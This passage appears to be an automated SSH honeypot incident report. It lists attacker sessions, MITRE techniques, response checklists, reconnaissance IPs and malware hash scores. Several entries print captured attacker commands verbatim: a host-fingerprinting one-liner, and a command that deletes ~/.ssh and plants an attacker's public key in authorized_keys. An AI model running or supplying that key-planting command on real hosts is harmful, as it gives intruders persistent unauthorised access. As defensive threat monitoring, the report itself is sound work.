- [ ] Block `206.189.138[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd7fc74241e1

| Field | Detail |
|---|---|
| **Source IP** | `206.189.138[.]45` |
| **First Seen** | 2026-03-15 05:01 |
| **Last Seen** | 2026-03-15 05:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:01:07` | `cowrie.session.connect` |
| `2026-03-15 05:01:08` | `cowrie.client.version` |
| `2026-03-15 05:01:08` | `cowrie.client.kex` |
| `2026-03-15 05:01:09` | `cowrie.login.success` |
| `2026-03-15 05:01:09` | `cowrie.session.params` |
| `2026-03-15 05:01:09` | `cowrie.command.input` |
| `2026-03-15 05:01:09` | `cowrie.command.input` |
| `2026-03-15 05:01:09` | `cowrie.command.input` |
| `2026-03-15 05:01:09` | `cowrie.command.input` |
| `2026-03-15 05:01:10` | `cowrie.log.closed` |
| `2026-03-15 05:01:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.138[.]45` to AbuseIPDB if not already reported
- [ ] Block `206.189.138[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-baf944dce123

| Field | Detail |
|---|---|
| **Source IP** | `118.193.36[.]245` |
| **First Seen** | 2026-03-15 05:01 |
| **Last Seen** | 2026-03-15 05:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:01:26` | `cowrie.session.connect` |
| `2026-03-15 05:01:26` | `cowrie.client.version` |
| `2026-03-15 05:01:26` | `cowrie.client.kex` |
| `2026-03-15 05:01:27` | `cowrie.login.success` |
| `2026-03-15 05:01:27` | `cowrie.session.params` |
| `2026-03-15 05:01:27` | `cowrie.command.input` |
| `2026-03-15 05:01:27` | `cowrie.command.failed` |
| `2026-03-15 05:01:27` | `cowrie.log.closed` |
| `2026-03-15 05:01:28` | `cowrie.session.params` |
| `2026-03-15 05:01:28` | `cowrie.command.input` |
| `2026-03-15 05:01:28` | `cowrie.session.file_download` |
| `2026-03-15 05:01:28` | `cowrie.log.closed` |
| `2026-03-15 05:01:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.36[.]245` to AbuseIPDB if not already reported
- [ ] Block `118.193.36[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f4be7fcf407

| Field | Detail |
|---|---|
| **Source IP** | `118.193.36[.]245` |
| **First Seen** | 2026-03-15 05:01 |
| **Last Seen** | 2026-03-15 05:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:01:29` | `cowrie.session.connect` |
| `2026-03-15 05:01:29` | `cowrie.client.version` |
| `2026-03-15 05:01:30` | `cowrie.client.kex` |
| `2026-03-15 05:01:30` | `cowrie.login.success` |
| `2026-03-15 05:01:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.36[.]245` to AbuseIPDB if not already reported
- [ ] Block `118.193.36[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d7921057b67

| Field | Detail |
|---|---|
| **Source IP** | `206.189.138[.]45` |
| **First Seen** | 2026-03-15 05:01 |
| **Last Seen** | 2026-03-15 05:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:01:47` | `cowrie.session.connect` |
| `2026-03-15 05:01:47` | `cowrie.client.version` |
| `2026-03-15 05:01:47` | `cowrie.client.kex` |
| `2026-03-15 05:01:48` | `cowrie.login.success` |
| `2026-03-15 05:01:49` | `cowrie.session.params` |
| `2026-03-15 05:01:49` | `cowrie.command.input` |
| `2026-03-15 05:01:49` | `cowrie.command.input` |
| `2026-03-15 05:01:49` | `cowrie.command.input` |
| `2026-03-15 05:01:49` | `cowrie.command.input` |
| `2026-03-15 05:01:49` | `cowrie.log.closed` |
| `2026-03-15 05:01:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.138[.]45` to AbuseIPDB if not already reported
- [ ] Block `206.189.138[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9df19c267bfb

| Field | Detail |
|---|---|
| **Source IP** | `206.189.138[.]45` |
| **First Seen** | 2026-03-15 05:02 |
| **Last Seen** | 2026-03-15 05:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:02:26` | `cowrie.session.connect` |
| `2026-03-15 05:02:27` | `cowrie.client.version` |
| `2026-03-15 05:02:27` | `cowrie.client.kex` |
| `2026-03-15 05:02:28` | `cowrie.login.success` |
| `2026-03-15 05:02:28` | `cowrie.session.params` |
| `2026-03-15 05:02:28` | `cowrie.command.input` |
| `2026-03-15 05:02:28` | `cowrie.command.input` |
| `2026-03-15 05:02:28` | `cowrie.command.input` |
| `2026-03-15 05:02:28` | `cowrie.command.input` |
| `2026-03-15 05:02:29` | `cowrie.log.closed` |
| `2026-03-15 05:02:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.138[.]45` to AbuseIPDB if not already reported
- [ ] Block `206.189.138[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aedd2240550f

| Field | Detail |
|---|---|
| **Source IP** | `206.189.138[.]45` |
| **First Seen** | 2026-03-15 05:03 |
| **Last Seen** | 2026-03-15 05:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:03:05` | `cowrie.session.connect` |
| `2026-03-15 05:03:05` | `cowrie.client.version` |
| `2026-03-15 05:03:05` | `cowrie.client.kex` |
| `2026-03-15 05:03:06` | `cowrie.login.success` |
| `2026-03-15 05:03:06` | `cowrie.session.params` |
| `2026-03-15 05:03:06` | `cowrie.command.input` |
| `2026-03-15 05:03:06` | `cowrie.command.input` |
| `2026-03-15 05:03:06` | `cowrie.command.input` |
| `2026-03-15 05:03:06` | `cowrie.command.input` |
| `2026-03-15 05:03:07` | `cowrie.log.closed` |
| `2026-03-15 05:03:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.138[.]45` to AbuseIPDB if not already reported
- [ ] Block `206.189.138[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffa3cdf7587e

| Field | Detail |
|---|---|
| **Source IP** | `118.193.36[.]245` |
| **First Seen** | 2026-03-15 05:03 |
| **Last Seen** | 2026-03-15 05:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:03:27` | `cowrie.session.connect` |
| `2026-03-15 05:03:27` | `cowrie.client.version` |
| `2026-03-15 05:03:27` | `cowrie.client.kex` |
| `2026-03-15 05:03:28` | `cowrie.login.success` |
| `2026-03-15 05:03:28` | `cowrie.session.params` |
| `2026-03-15 05:03:28` | `cowrie.command.input` |
| `2026-03-15 05:03:28` | `cowrie.command.failed` |
| `2026-03-15 05:03:28` | `cowrie.log.closed` |
| `2026-03-15 05:03:28` | `cowrie.session.params` |
| `2026-03-15 05:03:28` | `cowrie.command.input` |
| `2026-03-15 05:03:28` | `cowrie.session.file_download` |
| `2026-03-15 05:03:28` | `cowrie.log.closed` |
| `2026-03-15 05:03:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.36[.]245` to AbuseIPDB if not already reported
- [ ] Block `118.193.36[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-658c8f276d6f

| Field | Detail |
|---|---|
| **Source IP** | `118.193.36[.]245` |
| **First Seen** | 2026-03-15 05:03 |
| **Last Seen** | 2026-03-15 05:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:03:30` | `cowrie.session.connect` |
| `2026-03-15 05:03:30` | `cowrie.client.version` |
| `2026-03-15 05:03:30` | `cowrie.client.kex` |
| `2026-03-15 05:03:31` | `cowrie.login.success` |
| `2026-03-15 05:03:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.36[.]245` to AbuseIPDB if not already reported
- [ ] Block `118.193.36[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df88dd4bfc7b

| Field | Detail |
|---|---|
| **Source IP** | `206.189.138[.]45` |
| **First Seen** | 2026-03-15 05:03 |
| **Last Seen** | 2026-03-15 05:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:03:43` | `cowrie.session.connect` |
| `2026-03-15 05:03:43` | `cowrie.client.version` |
| `2026-03-15 05:03:43` | `cowrie.client.kex` |
| `2026-03-15 05:03:44` | `cowrie.login.success` |
| `2026-03-15 05:03:45` | `cowrie.session.params` |
| `2026-03-15 05:03:45` | `cowrie.command.input` |
| `2026-03-15 05:03:45` | `cowrie.command.input` |
| `2026-03-15 05:03:45` | `cowrie.command.input` |
| `2026-03-15 05:03:45` | `cowrie.command.input` |
| `2026-03-15 05:03:45` | `cowrie.log.closed` |
| `2026-03-15 05:03:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.138[.]45` to AbuseIPDB if not already reported
- [ ] Block `206.189.138[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f4c57f0f181

| Field | Detail |
|---|---|
| **Source IP** | `206.189.138[.]45` |
| **First Seen** | 2026-03-15 05:04 |
| **Last Seen** | 2026-03-15 05:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:04:25` | `cowrie.session.connect` |
| `2026-03-15 05:04:25` | `cowrie.client.version` |
| `2026-03-15 05:04:25` | `cowrie.client.kex` |
| `2026-03-15 05:04:25` | `cowrie.login.success` |
| `2026-03-15 05:04:25` | `cowrie.session.params` |
| `2026-03-15 05:04:25` | `cowrie.command.input` |
| `2026-03-15 05:04:25` | `cowrie.command.input` |
| `2026-03-15 05:04:25` | `cowrie.command.input` |
| `2026-03-15 05:04:25` | `cowrie.command.input` |
| `2026-03-15 05:04:25` | `cowrie.log.closed` |
| `2026-03-15 05:04:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.138[.]45` to AbuseIPDB if not already reported
- [ ] Block `206.189.138[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18f4316faaca

| Field | Detail |
|---|---|
| **Source IP** | `129.222.203[.]37` |
| **First Seen** | 2026-03-15 05:07 |
| **Last Seen** | 2026-03-15 05:12 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:07:36` | `cowrie.session.connect` |
| `2026-03-15 05:07:36` | `cowrie.client.version` |
| `2026-03-15 05:07:36` | `cowrie.client.kex` |
| `2026-03-15 05:07:37` | `cowrie.login.success` |
| `2026-03-15 05:07:38` | `cowrie.session.params` |
| `2026-03-15 05:07:38` | `cowrie.command.input` |
| `2026-03-15 05:07:38` | `cowrie.command.failed` |
| `2026-03-15 05:07:38` | `cowrie.log.closed` |
| `2026-03-15 05:07:39` | `cowrie.session.params` |
| `2026-03-15 05:07:39` | `cowrie.command.input` |
| `2026-03-15 05:07:39` | `cowrie.session.file_download` |
| `2026-03-15 05:07:39` | `cowrie.log.closed` |
| `2026-03-15 05:12:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.222.203[.]37` to AbuseIPDB if not already reported
- [ ] Block `129.222.203[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4877db00774

| Field | Detail |
|---|---|
| **Source IP** | `129.222.203[.]37` |
| **First Seen** | 2026-03-15 05:07 |
| **Last Seen** | 2026-03-15 05:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:07:43` | `cowrie.session.connect` |
| `2026-03-15 05:07:43` | `cowrie.client.version` |
| `2026-03-15 05:07:43` | `cowrie.client.kex` |
| `2026-03-15 05:07:45` | `cowrie.login.success` |
| `2026-03-15 05:07:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.222.203[.]37` to AbuseIPDB if not already reported
- [ ] Block `129.222.203[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.52.130[.]122` | **11** | 2026-03-15 02:34 | 2026-03-15 02:43 | 20m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `105.27.148[.]94` | **10** | 2026-03-15 02:36 | 2026-03-15 02:58 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.193.36[.]245` | **10** | 2026-03-15 04:45 | 2026-03-15 05:05 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.194.230[.]250` | **10** | 2026-03-15 02:17 | 2026-03-15 02:39 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.240.236[.]178` | **10** | 2026-03-15 02:17 | 2026-03-15 02:40 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `179.183.192[.]58` | **10** | 2026-03-15 02:40 | 2026-03-15 03:08 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `189.152.42[.]213` | **10** | 2026-03-15 02:33 | 2026-03-15 02:54 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `18.218.118[.]203` | **6** | 2026-03-15 03:53 | 2026-03-15 03:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.55[.]179` | **4** | 2026-03-15 02:34 | 2026-03-15 02:43 | 4m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `3.14.84[.]197` | **3** | 2026-03-15 01:53 | 2026-03-15 01:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `192.241.179[.]235` | **2** | 2026-03-15 01:57 | 2026-03-15 01:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `206.168.34[.]38` | **2** | 2026-03-15 00:44 | 2026-03-15 00:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `206.189.138[.]45` | **2** | 2026-03-15 04:58 | 2026-03-15 04:59 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.24[.]58` | 1 | 2026-03-15 02:35 | 2026-03-15 02:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.71.37[.]70` | 1 | 2026-03-15 00:19 | 2026-03-15 00:19 | 13s | 0 | `T1592` | 🟢 LOW |
| `111.14.162[.]81` | 1 | 2026-03-15 04:22 | 2026-03-15 04:22 | 13s | 0 | `T1592` | 🟢 LOW |
| `112.30.127[.]9` | 1 | 2026-03-15 01:09 | 2026-03-15 01:09 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.30.7[.]45` | 1 | 2026-03-15 00:50 | 2026-03-15 00:50 | 1s | 0 | `T1592` | 🟢 LOW |
| `119.237.27[.]185` | 1 | 2026-03-15 04:15 | 2026-03-15 04:16 | 30s | 0 | `T1592` | 🟢 LOW |
| `120.198.138[.]185` | 1 | 2026-03-15 03:02 | 2026-03-15 03:02 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.20[.]170` | 1 | 2026-03-15 02:35 | 2026-03-15 02:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.80[.]70` | 1 | 2026-03-15 02:41 | 2026-03-15 02:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `129.222.203[.]37` | 1 | 2026-03-15 05:07 | 2026-03-15 05:07 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `161.248.201[.]228` | 1 | 2026-03-15 05:10 | 2026-03-15 05:10 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `170.64.139[.]60` | 1 | 2026-03-15 01:03 | 2026-03-15 01:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.184.82[.]249` | 1 | 2026-03-15 02:33 | 2026-03-15 02:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.239.25[.]115` | 1 | 2026-03-15 02:37 | 2026-03-15 02:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.239.54[.]162` | 1 | 2026-03-15 05:08 | 2026-03-15 05:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.99.131[.]197` | 1 | 2026-03-15 02:56 | 2026-03-15 02:56 | 13s | 0 | `T1592` | 🟢 LOW |
| `2.55.70[.]124` | 1 | 2026-03-15 00:49 | 2026-03-15 00:49 | 5s | 0 | `T1592` | 🟢 LOW |
| `35.130.111[.]146` | 1 | 2026-03-15 00:14 | 2026-03-15 00:16 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-03-15 04:41 | 2026-03-15 04:41 | 26s | 0 | `T1592` | 🟢 LOW |
| `52.159.243[.]193` | 1 | 2026-03-15 05:26 | 2026-03-15 05:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.227.108[.]146` | 1 | 2026-03-15 01:05 | 2026-03-15 01:05 | 2s | 0 | `T1592` | 🟢 LOW |
| `79.143.42[.]170` | 1 | 2026-03-15 01:33 | 2026-03-15 01:33 | 30s | 0 | `T1592` | 🟢 LOW |
| `8.219.236[.]6` | 1 | 2026-03-15 02:15 | 2026-03-15 02:15 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (3 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `183.99.131[.]197` | KR | Korea Telecom | **100** ⚠️ | 6 |
| `129.222.203[.]37` | CO | SpaceX Services, Inc. | **100** ⚠️ | 2 |
| `101.71.37[.]70` | CN | UNICOM ZheJiang Province Network | **100** ⚠️ | 3 |
| `179.183.192[.]58` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 5 |
| `111.14.162[.]81` | CN | China Mobile Communications Corporation | **100** ⚠️ | 48 |
